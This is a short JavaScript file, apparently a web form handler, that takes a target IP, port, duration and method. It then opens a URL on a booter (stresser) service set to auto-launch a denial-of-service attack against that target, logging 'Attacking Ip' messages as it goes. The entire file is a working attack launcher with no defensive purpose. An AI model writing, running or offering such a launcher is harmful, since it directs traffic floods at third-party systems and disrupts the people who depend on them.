document.getElementById("Submit").onclick = function(){
    var Ip = document.getElementById("IP");
    var Port = document.getElementById("PORT");
    var Time = document.getElementById("TIME");
    var Method = document.getElementById("METHOD");

    if (Port.value.length == 0) {
        Port.value = 80;
    }
    if (Time.value.length == 0) {
        Time.value = 240;
    }

    console.log("Attacking Ip... (" + Ip.value + ")")
    console.log("Attacking On Port " + Port.value)
    console.log("Attack Time = " + Time.value)
    console.log("Attack Method = " + Method.value)

    var URL = "https://stressthem.to/booter?autoboot&ip=" + Ip.value + "&port=" + Port.value + "&time=" + Time.value + "&method=" + Method.value 
    console.log("Url = " + URL)
    window.open(URL,'_blank');

}
